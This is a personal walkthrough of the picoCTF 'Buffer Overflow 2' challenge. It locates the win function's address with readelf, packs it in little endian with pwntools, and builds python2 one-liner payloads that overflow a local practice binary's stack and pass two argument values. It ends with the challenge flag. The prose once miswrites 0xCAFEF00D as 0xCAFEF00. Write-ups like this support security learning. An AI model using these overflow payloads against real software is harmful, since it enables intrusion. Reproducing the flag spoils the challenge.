# Buffer Overflow 2

First we need to see if it is vulnerable to buffer overflows:

![[Pasted image 20220316195746.png]]

We are, from the source code we can see that we need to get to the function "win" so we can find its address like:

```
readelf -s vuln
```

This returns:

![[Pasted image 20220316195949.png]]

The address is: 0x08049296

We can make it little endian like:

```
from pwn import *
print(p32(0x08049296))
```

This returns \x96\x92\x04\x08

We can try this payload:

```
python2 -c "from pwn import *; print 'A' * 112 + '\x96\x92\x04\x08'" | ./vuln
```

![[Pasted image 20220316200212.png]]

This is good, we are reaching the **win** function, we just need to modify the parameters, we first create a "flag.txt" dummy file and continue testing.

We need "0xCAFEF00" in the first argument and "0xF00DF00D" in the second one. We also need both in little endian format. Lastly we need to put some dummy values as to jump the register that goes before the arguments.

The payload would look like:

```
python2 -c "from pwn import *; print 'A' * 112 + '\x96\x92\x04\x08' + 'AAAA' + p32(0xCAFEF00D) + p32(0xF00DF00D)  " | ./vuln
```

![[Pasted image 20220316200609.png]]

## Flag

> picoCTF{argum3nt5_4_d4yZ_920d6844}